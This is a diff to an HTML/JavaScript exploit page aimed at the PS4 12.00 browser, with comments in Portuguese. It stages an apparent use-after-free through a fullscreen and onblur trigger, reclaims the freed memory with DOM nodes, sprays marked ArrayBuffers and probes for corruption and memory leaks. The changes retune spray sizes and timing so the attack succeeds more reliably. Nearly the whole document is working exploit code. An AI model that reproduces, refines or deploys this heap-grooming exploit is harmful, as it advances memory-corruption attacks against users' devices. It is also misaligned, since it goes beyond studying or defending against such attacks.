@@ -2,17 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Heap Overlap Stage</title>
+<title>PS4 12.00 - UAF Heap Overlap (Fixed Timing)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → ArrayBuffer Overlap</h2>
+<h2>UAF → Heap Overlap (Timing Fix)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 LOG SEGURO
+// 🔒 LOG
 // ==========================
 let logBuffer = [];
 function log(msg){
@@ -24,11 +24,9 @@ function log(msg){
 // HEAP SETUP
 // ==========================
 function setupHeap(){
-    let arr=[];
     for(let i=0;i<5000;i++){
         let t=new Float64Array(8);
         t[0]=i;
-        arr.push(t);
     }
 }
 
@@ -38,7 +36,8 @@ function setupHeap(){
 function setupFullscreen(){
     let fsTarget=document.createElement("div");
 
-    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.innerHTML =
+        "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
 
     Object.assign(fsTarget.style,{
         background:"black",
@@ -50,14 +49,13 @@ function setupFullscreen(){
     });
 
     document.body.appendChild(fsTarget);
-
     fsTarget.webkitRequestFullscreen?.();
 
     return fsTarget;
 }
 
 // ==========================
-// 💣 RECLAIM CONTROLADO
+// 💣 RECLAIM
 // ==========================
 function preciseReclaim(size){
     log("[*] Reclaim size = "+size);
@@ -82,15 +80,10 @@ function preciseReclaim(size){
                 "_41414141_42424242_43434343<br>Press OPTIONS</h1>";
         }
         else{
-            if(i % 20 === 0){
-                el=document.createElement("svg");
-                el.innerHTML="<circle cx='50' cy='50' r='40'></circle>";
-            }else{
-                el=document.createTextNode("TXT_"+i+"_BBBB");
-                document.body.appendChild(el);
-                bucket.push(el);
-                continue;
-            }
+            el=document.createTextNode("TXT_"+i+"_BBBB");
+            document.body.appendChild(el);
+            bucket.push(el);
+            continue;
         }
 
         Object.assign(el.style,{
@@ -112,45 +105,42 @@ function preciseReclaim(size){
 // ==========================
 // 🔥 ARRAYBUFFER SPRAY
 // ==========================
-let buffers = [];
+let buffers=[];
 
 function sprayArrayBuffers(count){
 
-    buffers = [];
+    buffers=[];
 
     for(let i=0;i<count;i++){
 
-        let buf = new ArrayBuffer(0x100);
-        let view = new Uint32Array(buf);
+        let buf=new ArrayBuffer(0x40); // 🔥 tamanho ajustado
+        let view=new Uint32Array(buf);
 
-        view[0] = 0x41414141;
-        view[1] = 0x42424242;
-        view[2] = 0x43434343;
+        view[0]=0x41414141;
+        view[1]=0x42424242;
+        view[2]=0x43434343;
 
         buffers.push(view);
     }
 
-    log("[*] ArrayBuffer spray: "+buffers.length);
+    log("[*] ArrayBuffer spray = "+buffers.length);
 }
 
 // ==========================
-// 🔬 PROBE COMPLETO
+// 🔬 PROBE
 // ==========================
 function deepProbe(fsTarget){
 
     log("---- PROBE ----");
 
-    // ======================
-    // DESYNC
-    // ======================
     try{
-        let html = fsTarget.innerHTML;
-        let txt  = fsTarget.textContent;
+        let html=fsTarget.innerHTML;
+        let txt=fsTarget.textContent;
 
         log("[CHECK] innerHTML = "+html);
         log("[CHECK] textContent = "+txt);
 
-        if(html !== txt){
+        if(html!==txt){
             log("[!!!] DESYNC DETECTADO");
         }
 
@@ -158,20 +148,17 @@ function deepProbe(fsTarget){
         log("[ERR] DOM read");
     }
 
-    // ======================
-    // CHILD
-    // ======================
     try{
-        let child = fsTarget.firstChild;
+        let child=fsTarget.firstChild;
 
         log("[CHECK] child = "+child);
 
         if(child){
-            let v = child.nodeValue || child.textContent;
+            let v=child.nodeValue || child.textContent;
             log("[LEAK?] child data = "+v);
 
             if(v && v.includes("41414141")){
-                log("[!!!] POSSIVEL LEAK VIA CHILD");
+                log("[!!!] LEAK VIA CHILD");
             }
         }
 
@@ -179,14 +166,11 @@ function deepProbe(fsTarget){
         log("[ERR] child crash");
     }
 
-    // ======================
-    // WRITE TEST
-    // ======================
     try{
         fsTarget.innerHTML="<div>BBBBBBBB</div>";
         log("[PWN] write OK");
 
-        let after = fsTarget.innerHTML;
+        let after=fsTarget.innerHTML;
         log("[CHECK] after write = "+after);
 
         if(!after.includes("BBBB")){
@@ -198,21 +182,29 @@ function deepProbe(fsTarget){
     }
 
     // ======================
-    // ARRAYBUFFER CHECK
+    // 🔥 ARRAYBUFFER CHECK
     // ======================
     try{
 
         for(let i=0;i<buffers.length;i++){
 
-            let v = buffers[i];
+            let v=buffers[i];
 
-            if(v[0] !== 0x41414141){
-                log("[!!!] CORRUPÇÃO DETECTADA buffer "+i);
-                log("[VAL] "+v[0].toString(16));
+            if(
+                v[0]!==0x41414141 ||
+                v[1]!==0x42424242 ||
+                v[2]!==0x43434343
+            ){
+                log("[!!!] CORRUPÇÃO FORTE buffer "+i);
+                log(
+                    v[0].toString(16)+","+
+                    v[1].toString(16)+","+
+                    v[2].toString(16)
+                );
                 break;
             }
 
-            if(v[3] !== 0){
+            if(v[3]!==0){
                 log("[!!!] POSSIVEL LEAK REAL");
                 log("[VAL3] "+v[3].toString(16));
                 break;
@@ -223,15 +215,12 @@ function deepProbe(fsTarget){
         log("[CRASH] buffer read");
     }
 
-    // ======================
-    // ESTABILIDADE
-    // ======================
     try{
         log("[CHECK] parent = "+fsTarget.parentNode);
     }catch(e){}
 
     try{
-        let r = fsTarget.getBoundingClientRect();
+        let r=fsTarget.getBoundingClientRect();
         log("[CHECK] rect = "+r.height);
     }catch(e){
         log("[UAF] rect crash");
@@ -239,7 +228,7 @@ function deepProbe(fsTarget){
 }
 
 // ==========================
-// TRIGGER
+// 💥 TRIGGER (CORRIGIDO)
 // ==========================
 function trigger(fsTarget){
 
@@ -254,20 +243,24 @@ function trigger(fsTarget){
 
     }catch(e){}
 
-    // 🔥 FASE 1 — spray heap real
-    setTimeout(()=>sprayArrayBuffers(2000), 0);
+    // 🔥 ORDEM CORRETA
 
-    // 🔥 FASE 2 — reclaim DOM
-    setTimeout(()=>preciseReclaim(2000), 20);
-    setTimeout(()=>preciseReclaim(2200), 60);
-    setTimeout(()=>preciseReclaim(2500), 100);
+    // 1. abrir slot (DOM)
+    setTimeout(()=>preciseReclaim(2000), 0);
+    setTimeout(()=>preciseReclaim(2200), 40);
 
-    // 🔬 probes
-    setTimeout(()=>deepProbe(fsTarget), 30);
-    setTimeout(()=>deepProbe(fsTarget), 90);
-    setTimeout(()=>deepProbe(fsTarget), 160);
+    // 2. ocupar com heap real
+    setTimeout(()=>sprayArrayBuffers(4000), 80);
 
-    // dump
+    // 3. mistura final
+    setTimeout(()=>preciseReclaim(2500), 120);
+
+    // probes
+    setTimeout(()=>deepProbe(fsTarget), 60);
+    setTimeout(()=>deepProbe(fsTarget), 140);
+    setTimeout(()=>deepProbe(fsTarget), 220);
+
+    // log final
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     },400);
@@ -284,9 +277,9 @@ function runTest(){
 
     setupHeap();
 
-    let fsTarget = setupFullscreen();
+    let fsTarget=setupFullscreen();
 
-    window.onblur = function(){
+    window.onblur=function(){
         log("[*] onblur");
         setTimeout(()=>trigger(fsTarget),3000);
     };
